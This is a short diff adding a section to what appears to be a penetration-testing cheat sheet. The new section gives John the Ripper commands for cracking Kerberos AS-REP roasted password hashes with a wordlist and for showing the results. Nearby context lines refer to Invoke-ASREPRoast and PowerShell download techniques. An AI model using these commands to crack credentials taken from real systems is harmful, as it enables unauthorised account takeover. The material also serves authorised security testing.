@@ -431,6 +431,18 @@ Invoke-ASREPRoast -Verbose | Out-String -Width 4096
 ```
 aaa
 ```
+##### KERBEROASTING-ASREP - CRACK PASSWORD
+```
+xxx
+```
+```
+john hashes.txt --wordlist=wordlist.txt
+john --format=krb5asrep hashes.txt --wordlist=wordlist.txt
+john --show hashes.txt
+rm  /root/.john/john.pot
+```
+
+
 # POWERSHELL
 ## DOWNLOAD
 ##### POWERSHELL - DOWNLOAD AS STRING
